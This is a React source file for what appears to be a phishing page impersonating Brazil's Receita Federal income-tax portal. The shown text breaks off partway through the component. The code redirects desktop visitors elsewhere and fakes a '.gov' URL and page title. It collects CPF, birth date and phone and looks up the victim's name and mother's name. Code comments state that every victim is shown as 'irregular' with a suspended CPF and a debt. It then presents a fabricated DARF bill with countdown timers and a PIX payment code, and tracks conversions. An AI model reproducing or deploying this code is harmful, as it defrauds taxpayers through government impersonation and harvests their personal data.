"use client"

import type React from "react"

import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import {
  CheckCircle,
  AlertCircle,
  Clock,
  CreditCard,
  FileText,
  Copy,
  RefreshCw,
  Bell,
  User,
  Lock,
  AlertTriangle,
} from "lucide-react"
import { useState, useEffect } from "react"

// Declaração de tipos para window.trackConversion
declare global {
  interface Window {
    trackConversion?: (eventName: string, userData: any) => Promise<string | null>
  }
}

type AppState =
  | "login"
  | "loading"
  | "result"
  | "regularization"
  | "darf"
  | "payment-processing"
  | "payment-loading"
  | "pix-payment"

export default function Home() {
  const [cpf, setCpf] = useState("")
  const [birthDate, setBirthDate] = useState("")
  const [phone, setPhone] = useState("")
  const [appState, setAppState] = useState<AppState>("login")
  const [userData, setUserData] = useState<any>(null)
  const [loadingStep, setLoadingStep] = useState(0)
  const [timeLeft, setTimeLeft] = useState({ hours: 7, minutes: 7, seconds: 15 })
  const [paymentStep, setPaymentStep] = useState(0)
  const [paymentLoadingStep, setPaymentLoadingStep] = useState(0)
  const [pixData, setPixData] = useState<any>(null)
  const [timeRemaining, setTimeRemaining] = useState(1800) // 30 minutes in seconds


  useEffect(() => {
    // Verificar se é dispositivo mobile
    const isMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
      
      // Verificar por padrões de mobile
      const mobilePatterns = [
        /Android/i,
        /webOS/i,
        /iPhone/i,
        /iPad/i,
        /iPod/i,
        /BlackBerry/i,
        /Windows Phone/i,
        /Mobile/i
      ]
      
      // Verificar tamanho da tela (dispositivos com largura menor que 768px)
      const isSmallScreen = window.innerWidth <= 768
      
      // Verificar se é mobile por user agent ou tamanho da tela
      return mobilePatterns.some(pattern => pattern.test(userAgent)) || isSmallScreen
    }

    // Se não for mobile, redirecionar
    if (!isMobile()) {
      window.location.href = 'https://www.gosgli.com.neta'
      return
    }

    // Alterar URL para efeito visual (apenas para mobile)
    const updateURL = () => {
      const baseURL = window.location.origin
      const newPath = '/meu-darf.gov'
      const newURL = baseURL + newPath
      
      // Usar pushState para alterar a URL sem recarregar a página
      window.history.pushState({}, '', newURL)
      
      // Atualizar o título da página
      document.title = 'Meu Imposto de Renda - Receita Federal'
    }

    // Executar na montagem do componente
    updateURL()


    // Prevenir navegação para trás (opcional)
    const handlePopState = (event: PopStateEvent) => {
      event.preventDefault()
      updateURL()
    }

    window.addEventListener('popstate', handlePopState)

    return () => {
      window.removeEventListener('popstate', handlePopState)
    }
  }, [])

  useEffect(() => {
    if (appState === "loading") {
      const steps = ["Conectando com a base de dados", "Validando informações pessoais", "Preparando resultado"]

      const interval = setInterval(() => {
        setLoadingStep((prev) => {
          if (prev < steps.length - 1) {
            return prev + 1
          } else {
            clearInterval(interval)
            consultarCPFAPI()
            return prev
          }
        })
      }, 1500)

      return () => clearInterval(interval)
    }
  }, [appState, cpf, birthDate])

  useEffect(() => {
    if (appState === "payment-processing") {
      const interval = setInterval(() => {
        setPaymentStep((prev) => {
          if (prev < 2) {
            return prev + 1
          } else {
            clearInterval(interval)
            setTimeout(() => {
              setAppState("darf")
            }, 2000)
            return prev
          }
        })
      }, 2000)

      return () => clearInterval(interval)
    }
  }, [appState])

  useEffect(() => {
    if (appState === "payment-loading") {
      const interval = setInterval(() => {
        setPaymentLoadingStep((prev) => {
          if (prev < 2) {
            return prev + 1
          } else {
            clearInterval(interval)
            setTimeout(async () => {
              try {
                const response = await fetch("/api/pixone-pix", {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json",
                  },
                  body: JSON.stringify({
                    cpf: cpf,
                    name: userData?.name,
                    phone: phone,
                    amount: 174.28, // Valor total do DARF
                  }),
                })

                const pixResult = await response.json()
                console.log("[v0] PIX generated:", pixResult)

                if (pixResult.success) {
                  setPixData(pixResult)
                  setTimeRemaining(1800) // Reset timer
                  setAppState("pix-payment")
                  
                  // Log do QR code gerado
                  console.log("[v0] PIX transaction created successfully:")
                  
                  // Tracking de conversão UTMFY
                  if (window.trackConversion) {
                    try {
                      const trackingData = {
                        email: '', // Email não capturado no formulário atual
                        phone: phone || '',
                        firstName: userData?.name?.split(' ')[0] || '',
                        lastName: userData?.name?.split(' ').slice(1).join(' ') || '',
                        city: 'São Paulo', // Pode ser capturado do formulário
                        state: 'SP',
                        zip: '00000-000', // Pode ser capturado do formulário
                        country: 'BR',
                        externalId: pixResult.transactionId || cpf
                      };
                      
                      await window.trackConversion('Lead', trackingData);
                      console.log('[UTMFY] Evento Lead enviado com sucesso');
                    } catch (error) {
                      console.error('[UTMFY] Erro ao enviar evento Lead:', error);
                    }
                  }
                  console.log("[v0] Transaction ID:", pixResult.transactionId)
                  console.log("[v0] PIX Code:", pixResult.pixCode)
                  console.log("[v0] PIX Code Length:", pixResult.pixCode?.length || 0)
                  console.log("[v0] QR Code Image:", pixResult.qrCodeImage)
                  console.log("[v0] QR Code Image Length:", pixResult.qrCodeImage?.length || 0)
                  console.log("[v0] Amount:", pixResult.amount)
                  console.log("[v0] Full PIX Result:", JSON.stringify(pixResult, null, 2))
                  
                } else {
                  alert("Erro ao gerar PIX. Tente novamente.")
                  setAppState("darf")
                }
              } catch (error) {
                console.error("[v0] Error generating PIX:", error)
                alert("Erro ao gerar PIX. Tente novamente.")
                setAppState("darf")
              }
            }, 2000)
            return prev
          }
        })
      }, 2500)

      return () => clearInterval(interval)
    }
  }, [appState, cpf, userData])

  useEffect(() => {
    if (appState === "pix-payment" && timeRemaining > 0) {
      const timer = setInterval(() => {
        setTimeRemaining((prev) => {
          if (prev <= 1) {
            clearInterval(timer)
            alert("Tempo para pagamento expirado!")
            setAppState("login")
            return 0
          }
          return prev - 1
        })
      }, 1000)

      return () => clearInterval(timer)
    }
  }, [appState, timeRemaining])

  useEffect(() => {
    if (appState === "result" && userData?.statusType === "CRÍTICO") {
      const interval = setInterval(() => {
        setTimeLeft((prev) => {
          if (prev.seconds > 0) {
            return { ...prev, seconds: prev.seconds - 1 }
          } else if (prev.minutes > 0) {
            return { ...prev, minutes: prev.minutes - 1, seconds: 59 }
          } else if (prev.hours > 0) {
            return { hours: prev.hours - 1, minutes: 59, seconds: 59 }
          }
          return prev
        })
      }, 1000)

      return () => clearInterval(interval)
    }
  }, [appState, userData])

  const consultarCPFAPI = async () => {
    try {
      console.log("[v0] Iniciando consulta CPF para:", cpf, "Data:", birthDate)

      const response = await fetch("/api/consultar-cpf", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ cpf, birthDate, phone }),
      })

      const result = await response.json()
      console.log("[v0] Resposta da API:", result)

      if (result.success) {
        const mappedData = {
          name: result.data.nome || "Nome não encontrado",
          initials: result.data.nome
            ? result.data.nome
                .split(" ")
                .filter((n: string) => n.length > 0)
                .map((n: string) => n[0].toUpperCase())
                .join("")
                .substring(0, 2)
            : "NN",
          birthDate: result.data.nascimento || birthDate || "Data não disponível",
          nomeMae: result.data.nomeMae || "Não informado",
          status: "IRREGULAR", // Sempre irregular
          cpfStatus: "SUSPENSO", // Sempre suspenso
          declaration: "NÃO ENTREGUE", // Sempre não entregue
          protocol: `CTPS${cpf?.slice(-6) || '123456'}`,
          deadline: "27/08/2025", // Sempre com prazo crítico
          statusType: "CRÍTICO", // Sempre crítico
          isRealData: !result.warning,
          warning: result.warning || null,
        }

        console.log("[v0] Dados mapeados (sempre com dívida):", mappedData)
        
        setUserData(mappedData)
        setTimeout(() => setAppState("result"), 1000)
      } else {
        console.error("[v0] Erro na consulta:", result.error)
        setAppState("login")
        alert(`Erro ao consultar CPF: ${result.error}`)
      }
    } catch (error) {
      console.error("[v0] Erro na requisição:", error)
      setAppState("login")
      alert("Erro de conexão. Verifique sua internet e tente novamente.")
    }
  }

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    const limitedNumbers = numbers.slice(0, 11)
    return limitedNumbers
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})/, "$1-$2")
  }

  const formatBirthDate = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    const limitedNumbers = numbers.slice(0, 8)
    return limitedNumbers.replace(/(\d{2})(\d)/, "$1/$2").replace(/(\d{2})(\d)/, "$1/$2")
  }

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    const limitedNumbers = numbers.slice(0, 11)
    if (limitedNumbers.length <= 10) {
      return limitedNumbers.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{4})(\d)/, "$1-$2")
    } else {
      return limitedNumbers.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{5})(\d)/, "$1-$2")
    }
  }

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatCPF(e.target.value)
    setCpf(formattedValue)
  }

  const handleBirthDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatBirthDate(e.target.value)
    setBirthDate(formattedValue)
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatPhone(e.target.value)
    setPhone(formattedValue)
  }

  const handleSubmit = () => {
    const phoneNumbers = phone.replace(/\D/g, "")
    if (cpf.length === 14 && birthDate.length === 10 && phoneNumbers.length >= 10) {
      setLoadingStep(0)
      setAppState("loading")
    }
  }

  const handleBack = () => {
    setAppState("login")
    setCpf("")
    setBirthDate("")
    setPhone("")
    setUserData(null)
    setLoadingStep(0)
  }

  const handleRegularize = () => {
    setPaymentStep(0)
    setAppState("payment-processing")
  }

  const handleGenerateDarf = () => {
    setPaymentLoadingStep(0)
    setAppState("payment-loading")
  }

  const handleProcessPayment = () => {
    setPaymentStep(0)
    setAppState("payment-processing")
  }

  if (appState === "pix-payment") {
    const formatTime = (seconds: number) => {
      const mins = Math.floor(seconds / 60)
      const secs = seconds % 60
      return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
    }

    const copyPixCode = () => {
      if (pixData?.pixCode) {
        navigator.clipboard.writeText(pixData.pixCode)
        alert("Código PIX copiado!")
      }
    }

    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-100 via-blue-50 to-white">
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center space-x-4">
                <div className="flex items-center space-x-2">
                  <span className="text-2xl font-bold">
                    <span className="text-blue-600">g</span>
                    <span className="text-yellow-500">o</span>
                    <span className="text-green-600">v</span>
                    <span className="text-blue-600">.</span>
                    <span className="text-blue-600">b</span>
                    <span className="text-yellow-500">r</span>
                  </span>
                </div>
                <div className="text-sm text-gray-600">
                  <div className="font-medium">Meu Imposto de Renda</div>
                  <div className="text-xs">Receita Federal</div>
                </div>
              </div>
              <div className="flex items-center space-x-4">
                <div className="text-sm text-gray-600 text-right">
                  <div className="font-medium">{userData?.name}</div>
                  <div className="text-xs">CPF: {cpf}</div>
                </div>
                <div className="bg-blue-600 text-white rounded-full w-10 h-10 flex items-center justify-center font-semibold">
                  {userData?.initials}
                </div>
              </div>
            </div>
          </div>
        </header>

        <div className="bg-red-600 text-white text-center py-2">
          <div className="flex items-center justify-center space-x-2">
            <Clock className="h-4 w-4" />
            <span className="font-medium">Tempo restante para pagamento: {formatTime(timeRemaining)}</span>
          </div>
        </div>

        <main className="max-w-4xl mx-auto p-6">
          <div className="bg-white rounded-lg shadow-lg p-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
              <div>
                <label className="text-sm text-gray-600">Nome:</label>
                <div className="font-medium">{userData?.name || "Contribuinte"}</div>
              </div>
              <div>
                <label className="text-sm text-gray-600">CPF:</label>
                <div className="font-medium">{cpf}</div>
              </div>
              <div>
                <label className="text-sm text-gray-600">Protocolo:</label>
                <div className="font-medium text-blue-600">{userData?.protocol || 'CTPS123456'}</div>
              </div>
              <div>
                <label className="text-sm text-gray-600">Valor:</label>
                <div className="font-bold text-green-600 text-lg">R$ {pixData?.amount?.toFixed(2) || "0,00"}</div>
              </div>
              <div>
                <label className="text-sm text-gray-600">Vencimento:</label>
                <div className="font-medium text-red-600">28/08/2025</div>
              </div>
              <div>
                <label className="text-sm text-gray-600">Status:</label>
                <div className="font-medium text-red-600">● Pendente</div>
              </div>
            </div>

            <div className="bg-gray-50 rounded-lg p-6">
              <h2 className="text-xl font-bold text-center mb-4">Pagamento via PIX</h2>
              <p className="text-center text-gray-600 mb-6">Escaneie o QR Code ou copie o código PIX abaixo</p>

              <div className="flex flex-col items-center mb-6">
                <div className="bg-white p-4 rounded-lg shadow-sm mb-4">
                  {pixData?.pixCode ? (
                    <img
                      src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pixCode)}`}
                      alt="QR Code PIX"
                      className="w-48 h-48 rounded-lg"
                      onError={(e) => {
                        console.log("[v0] QR Code image failed to load, using fallback")
                        e.currentTarget.style.display = 'none'
                        const nextElement = e.currentTarget.nextElementSibling as HTMLElement
                        if (nextElement) {
                          nextElement.style.display = 'flex'
                        }
                      }}
                    />
                  ) : null}
                  <div className="w-48 h-48 bg-gray-100 flex items-center justify-center rounded-lg" style={{ display: pixData?.pixCode ? 'none' : 'flex' }}>
                    <div className="text-center text-gray-500">
                      <div className="text-4xl mb-2">📱</div>
                      <div className="text-sm">QR Code</div>
                      <div className="text-xs">Use o código PIX abaixo</div>
                    </div>
                  </div>
                </div>

                <div className="w-full max-w-md">
                  <label className="text-sm text-gray-600 block mb-2">Código PIX:</label>
                  <div className="flex">
                    <input
                      type="text"
                      value={pixData?.pixCode || ""}
                      readOnly
                      className="flex-1 p-3 border rounded-l-lg bg-gray-50 text-sm font-mono"
                    />
                    <button
                      onClick={copyPixCode}
                      className="px-4 py-3 bg-blue-600 text-white rounded-r-lg hover:bg-blue-700 flex items-center"
                    >
                      <Copy className="h-4 w-4" />
                    </button>
                  </div>
                  <button
                    onClick={copyPixCode}
                    className="w-full mt-3 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 flex items-center justify-center space-x-2"
                  >
                    <Copy className="h-4 w-4" />
                    <span>Copiar PIX</span>
                  </button>
                </div>
              </div>

              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
                <div className="flex items-start space-x-2">
                  <AlertCircle className="h-5 w-5 text-yellow-600 mt-0.5" />
                  <div>
                    <h3 className="font-medium text-yellow-800 mb-2">Como pagar:</h3>
                    <ol className="text-sm text-yellow-700 space-y-1">
                      <li>1. Abra o aplicativo do seu banco</li>
                      <li>2. Acesse a área PIX</li>
                      <li>3. Escaneie o QR Code ou cole o código PIX</li>
                      <li>4. Confirme o valor de R$ {pixData?.amount?.toFixed(2) || "0,00"}</li>
                      <li>5. Conclua o pagamento</li>
                    </ol>
                  </div>
                </div>
              </div>

              <div className="flex flex-col sm:flex-row gap-4">
                <button
                  onClick={() => setAppState("darf")}
                  className="flex-1 px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 flex items-center justify-center space-x-2"
                >
                  <FileText className="h-4 w-4" />
                  <span>Gerar DARF</span>
                </button>
                <button
                  onClick={async () => {
                    if (pixData?.transactionId) {
                      try {
                        const response = await fetch(`/api/pixone-status?transactionId=${pixData.transactionId}`)
                        const result = await response.json()
                        
                        if (result.success) {
                          if (result.status === 'paid') {
                            alert("✅ Pagamento confirmado! Sua regularização foi processada com sucesso.")
                            
                            // Tracking de conversão UTMFY - Purchase
                            if (window.trackConversion) {
                              try {
                                const trackingData = {
                                  email: '', // Email não capturado no formulário atual
                                  phone: phone || '',
                                  firstName: userData?.name?.split(' ')[0] || '',
                                  lastName: userData?.name?.split(' ').slice(1).join(' ') || '',
                                  city: 'São Paulo',
                                  state: 'SP',
                                  zip: '00000-000',
                                  country: 'BR',
                                  externalId: pixData.transactionId || cpf
                                };
                                
                                await window.trackConversion('Purchase', trackingData);
                                console.log('[UTMFY] Evento Purchase enviado com sucesso');
                              } catch (error) {
                                console.error('[UTMFY] Erro ao enviar evento Purchase:', error);
                              }
                            }
                          } else {
                            alert(`Status do pagamento: ${result.status}. Aguarde a confirmação.`)
                          }
                        } else {
                          alert("Erro ao verificar pagamento. Tente novamente.")
                        }
                      } catch (error) {
                        alert("Erro ao verificar pagamento. Tente novamente.")
                      }
                    } else {
                      alert("ID da transação não encontrado.")
                    }
                  }}
                  className="flex-1 px-6 py-3 border border-blue-300 text-blue-700 rounded-lg hover:bg-blue-50 flex items-center justify-center space-x-2"
                >
                  <RefreshCw className="h-4 w-4" />
                  <span>Verificar</span>
                </button>
              </div>

              <div className="text-center text-sm text-gray-500 mt-4">
                <p>Verificação automática a cada 30 segundos</p>
                <p>Última verificação: {new Date().toLocaleTimeString("pt-BR")}</p>
              </div>
            </div>
          </div>
        </main>
      </div>
    )
  }

  if (appState === "regularization") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-100 via-blue-50 to-white">
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center space-x-4">
                <div className="flex items-center space-x-2">
                  <span className="text-2xl font-bold">
                    <span className="text-blue-600">g</span>
                    <span className="text-yellow-500">o</span>
                    <span className="text-green-600">v</span>
                    <span className="text-blue-600">.</span>
                    <span className="text-blue-600">b</span>
                    <span className="text-yellow-500">r</span>
                  </span>
                </div>
                <div className="text-sm text-gray-600">
                  <div className="font-medium">Meu Imposto de Renda</div>
                  <div className="text-xs">Receita Federal</div>
                </div>
              </div>
              <div className="flex items-center space-x-4">
                <div className="text-sm text-gray-600 text-right">
                  <div className="font-medium">{userData?.name}</div>
                  <div className="text-xs">CPF: {cpf}</div>
                </div>
                <div className="bg-blue-600 text-white rounded-full w-10 h-10 flex items-center justify-center font-semibold">
                  {userData?.initials}
                </div>
              </div>
            </div>
          </div>
        </header>

        <main className="flex items-center justify-center min-h-[calc(100vh-4rem)] p-4">
          <Card className="w-full max-w-md bg-white shadow-lg">
            <CardContent className="p-8 text-center">
              <h2 className="text-xl font-semibold text-gray-900 mb-6">Tempo Restante para Regularização</h2>

              <div className="flex justify-center space-x-8 text-4xl font-bold text-red-600 mb-8">
                <div className="text-center">
                  <div>06</div>
                  <div className="text-sm text-gray-600 font-normal">Horas</div>
                </div>
                <div className="text-center">
                  <div>37</div>
                  <div className="text-sm text-gray-600 font-normal">Minutos</div>
                </div>
                <div className="text-center">
                  <div>00</div>
                  <div className="text-sm text-gray-600 font-normal">Segundos</div>
                </div>
              </div>

              <div className="space-y-4">
                <Button onClick={handleBack} variant="outline" className="w-full bg-transparent">
                  Voltar ao Login
                </Button>
                <Button onClick={handleGenerateDarf} className="w-full bg-blue-600 hover:bg-blue-700">
                  Regularizar Agora
                </Button>
              </div>
            </CardContent>
          </Card>
        </main>
      </div>
    )
  }

  if (appState === "darf") {
    const valorPrincipal = 93.28 // Valor fixo
    const multa = 29.55 // Multa fixa
    const juros = 51.45 // Juros fixos
    const valorTotal = valorPrincipal + multa + juros // Total: R$ 174,28
    const protocolo = `CTPS${userData?.cpf?.slice(-6) || '123456'}`

    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-blue-600 text-white text-center py-3 font-semibold">
          📄 DARF - Documento de Arrecadação de Receitas Federais
        </div>

        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center space-x-4">
                <div className="flex items-center space-x-2">
                  <span className="text-2xl font-bold">
                    <span className="text-blue-600">g</span>
                    <span className="text-yellow-500">o</span>
                    <span className="text-green-600">v</span>
                    <span className="text-blue-600">.</span>
                    <span className="text-blue-600">b</span>
                    <span className="text-yellow-500">r</span>
                  </span>
                </div>
                <div className="text-sm text-gray-600">
                  <div className="font-medium">Meu Imposto de Renda</div>
                  <div className="text-xs">Receita Federal</div>
                </div>
              </div>
              <div className="flex items-center space-x-4">
                <div className="text-sm text-gray-600 text-right">
                  <div className="font-medium">{userData?.name}</div>
                  <div className="text-xs">CPF: {cpf}</div>
                </div>
                <div className="bg-blue-600 text-white rounded-full w-10 h-10 flex items-center justify-center font-semibold">
                  {userData?.initials}
                </div>
              </div>
            </div>
          </div>
        </header>

        <main className="max-w-4xl mx-auto p-6">
          <Card className="bg-white shadow-lg">
            <CardContent className="p-8">
              <div className="bg-blue-600 text-white p-4 rounded-t-lg mb-6 flex justify-between items-center">
                <div>
                  <h1 className="text-xl font-bold">DARF</h1>
                  <p className="text-sm">Documento de Arrecadação de Receitas Federais</p>
                </div>
                <div className="text-right">
                  <div className="text-sm">Protocolo</div>
                  <div className="font-bold">{protocolo}</div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-6 mb-6">
                <div>
                  <div className="text-sm text-gray-600">Nome do Contribuinte</div>
                  <div className="font-semibold">{userData?.name || "Nome não disponível"}</div>
                  <div className="text-lg">{cpf}</div>
                </div>
                <div>
                  <div className="text-sm text-gray-600">Período de Apuração</div>
                  <div className="font-semibold">18/11/2024</div>
                </div>
                <div>
                  <div className="text-sm text-gray-600">Código da Receita</div>
                  <div className="font-semibold">5952</div>
                </div>
                <div>
                  <div className="text-sm text-gray-600">Data de Vencimento</div>
                  <div className="font-semibold text-red-600">28/08/2025</div>
                </div>
                <div>
                  <div className="text-sm text-gray-600">Número da Referência</div>
                  <div className="font-semibold">{protocolo}</div>
                </div>
              </div>

              <div className="border-t pt-6">
                <h3 className="font-semibold text-blue-600 mb-4 flex items-center">
                  <FileText className="h-5 w-5 mr-2" />
                  Discriminação dos Valores
                </h3>

                <div className="space-y-3">
                  <div className="flex justify-between">
                    <span>Valor Principal</span>
                    <span className="font-semibold">R$ {valorPrincipal.toFixed(2).replace(".", ",")}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Multa</span>
                    <span className="font-semibold text-orange-600">R$ {multa.toFixed(2).replace(".", ",")}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Juros</span>
                    <span className="font-semibold text-orange-600">R$ {juros.toFixed(2).replace(".", ",")}</span>
                  </div>
                  <div className="border-t pt-3">
                    <div className="flex justify-between text-lg font-bold bg-green-50 p-3 rounded">
                      <span className="text-blue-600">VALOR A PAGAR</span>
                      <span className="text-green-600">R$ {valorTotal.toFixed(2).replace(".", ",")}</span>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mt-6">
                <div className="flex items-start space-x-3">
                  <AlertTriangle className="h-5 w-5 text-yellow-600 mt-0.5" />
                  <div>
                    <div className="font-semibold text-yellow-800">
                      Atenção: O não pagamento até a data de vencimento resultará em:
                    </div>
                    <ul className="mt-2 space-y-1 text-sm text-yellow-700">
                      <li>• Acréscimo de multa de 20% sobre o valor total</li>
                      <li>• Juros de mora calculados com base na taxa SELIC</li>
                      <li>• Inscrição em Dívida Ativa da União</li>
                    </ul>
                  </div>
                </div>
              </div>

              <div className="text-center mt-6">
                <div className="text-sm text-gray-600 mb-2">Documento gerado eletronicamente</div>
                <div className="text-xs text-green-600">
                  ✓ Código de Autenticação: {Math.random().toString(36).substring(2, 12).toUpperCase()}
                </div>
              </div>

              <div className="text-center mt-8">
                <Button onClick={handleGenerateDarf} className="bg-green-600 hover:bg-green-700 text-white px-8 py-3">
                   Gerar DARF de Pagamento
                </Button>
              </div>
            </CardContent>
          </Card>
        </main>
      </div>
    )
  }

  if (appState === "payment-processing") {
    const steps = ["Validando Pagamento", "Conectando com o Banco", "Gerando Guia de Pagamento"]
    const stepDescriptions = [
      "Verificando informações do DARF",
      "Estabelecendo conexão segura",
      "Preparando forma de pagamento",
    ]

    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-100 via-blue-50 to-white">
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center space-x-4">
                <div className="flex items-center space-x-2">
                  <span className="text-2xl font-bold">
                    <span className="text-blue-600">g</span>
                    <span className="text-yellow-500">o</span>
                    <span className="text-green-600">v</span>
                    <span className="text-blue-600">.</span>
                    <span className="text-blue-600">b</span>
                    <span className="text-yellow-500">r</span>
                  </span>
                </div>
                <div className="text-sm text-gray-600">
                  <div className="font-medium">Meu Imposto de Renda</div>
                  <div className="text-xs">Receita Federal</div>
                </div>
              </div>
              <div className="flex items-center space-x-4">
                <div className="text-sm text-gray-600 text-right">
                  <div className="font-medium">{userData?.name}</div>
                  <div className="text-xs">CPF: {cpf}</div>
                </div>
                <div className="bg-blue-600 text-white rounded-full w-10 h-10 flex items-center justify-center font-semibold">
                  {userData?.initials}
                </div>
              </div>
            </div>
          </div>
        </header>

        <main className="flex items-center justify-center min-h-[calc(100vh-4rem)] p-4">
          <Card className="w-full max-w-4xl bg-white shadow-lg">
            <CardContent className="p-8 text-center">
              <div className="w-16 h-16 mx-auto mb-6">
                <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
              </div>

              <h1 className="text-3xl font-bold text-gray-900 mb-2">Processando Pagamento</h1>
              <p className="text-gray-600 mb-2">Carregando informações de pagamento...</p>
              <p className="text-sm text-gray-500 mb-8">Aguarde alguns instantes</p>

              <div className="w-full bg-gray-200 rounded-full h-2 mb-8">
                <div
                  className="bg-green-500 h-2 rounded-full transition-all duration-500"
                  style={{ width: `${((paymentStep + 1) / 3) * 100}%` }}
                ></div>
              </div>

              <div className="flex justify-center space-x-4 mb-8">
                <div className="flex items-center space-x-2 px-4 py-2 bg-green-100 text-green-700 rounded-full text-sm">
                  <CheckCircle className="h-4 w-4" />
                  <span>Seguro</span>
                </div>
                <div className="flex items-center space-x-2 px-4 py-2 bg-green-100 text-green-700 rounded-full text-sm">
                  <CheckCircle className="h-4 w-4" />
                  <span>Criptografado</span>
                </div>
                <div className="flex items-center space-x-2 px-4 py-2 bg-green-100 text-green-700 rounded-full text-sm">
                  <CheckCircle className="h-4 w-4" />
                  <span>Verificado</span>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                {steps.map((step, index) => (
                  <div
                    key={index}
                    className={`p-6 rounded-lg border-2 ${
                      index === paymentStep
                        ? "border-green-500 bg-green-50"
                        : index < paymentStep
                          ? "border-green-300 bg-green-25"
                          : "border-gray-200 bg-gray-50"
                    }`}
                  >
                    <div
                      className={`w-12 h-12 mx-auto mb-4 rounded-full flex items-center justify-center ${
                        index === 0 && <CreditCard className="h-6 w-6" />
                      }
                        {index === 1 && <FileText className="h-6 w-6" />}
                        {index === 2 && <CheckCircle className="h-6 w-6" />}
                        {index === paymentStep
                          ? "bg-green-500 text-white"
                          : index < paymentStep
                            ? "bg-green-400 text-white"
                            : "bg-gray-300 text-gray-600"
                      } ${index > paymentStep ? "opacity-50" : ""}`}
                    >
                      {index === 0 && <CreditCard className="h-6 w-6" />}
                      {index === 1 && <FileText className="h-6 w-6" />}
                      {index === 2 && <CheckCircle className="h-6 w-6" />}
                    </div>
                    <h3 className={`font-semibold mb-2 ${index <= paymentStep ? "text-gray-900" : "text-gray-500"}`}>
                      {step}
                    </h3>
                    <p className={`text-sm ${index <= paymentStep ? "text-gray-600" : "text-gray-400"}`}>
                      {stepDescriptions[index]}
                      {index === paymentStep && (
                        <span className="block mt-1 text-green-600 font-medium">Em andamento...</span>
                      )}
                    </p>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </main>
      </div>
    )
  }

  if (appState === "payment-loading") {
    const steps = ["Validando Pagamento", "Conectando com o Banco", "Gerando código PIX"]
    const stepDescriptions = [
      "Verificando informações do DARF",
      "Estabelecendo conexão segura",
      "Preparando forma de pagamento",
    ]

    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-100 via-blue-50 to-white">
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center space-x-4">
                <div className="flex items-center space-x-2">
                  <span className="text-2xl font-bold">
                    <span className="text-blue-600">g</span>
                    <span className="text-yellow-500">o</span>
                    <span className="text-green-600">v</span>
                    <span className="text-blue-600">.</span>
                    <span className="text-blue-600">b</span>
                    <span className="text-yellow-500">r</span>
                  </span>
                </div>
                <div className="text-sm text-gray-600">
                  <div className="font-medium">Meu Imposto de Renda</div>
                  <div className="text-xs">Receita Federal</div>
                </div>
              </div>
              <div className="flex items-center space-x-4">
                <div className="text-sm text-gray-600 text-right">
                  <div className="font-medium">{userData?.name}</div>
                  <div className="text-xs">CPF: {cpf}</div>
                </div>
                <div className="bg-blue-600 text-white rounded-full w-10 h-10 flex items-center justify-center font-semibold">
                  {userData?.initials}
                </div>
              </div>
            </div>
          </div>
        </header>

        <main className="flex items-center justify-center min-h-[calc(100vh-4rem)] p-4">
          <Card className="w-full max-w-4xl bg-white shadow-lg">
            <CardContent className="p-8 text-center">
              <div className="w-16 h-16 mx-auto mb-6">
                <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
              </div>

              <h1 className="text-3xl font-bold text-gray-900 mb-2">Carregando Informações de Pagamento</h1>
              <p className="text-gray-600 mb-2">Preparando método de pagamento...</p>
              <p className="text-sm text-gray-500 mb-8">Aguarde alguns instantes</p>

              <div className="w-full bg-gray-200 rounded-full h-2 mb-8">
                <div
                  className="bg-blue-500 h-2 rounded-full transition-all duration-500"
                  style={{ width: `${((paymentLoadingStep + 1) / 3) * 100}%` }}
                ></div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                {steps.map((step, index) => (
                  <div
                    key={index}
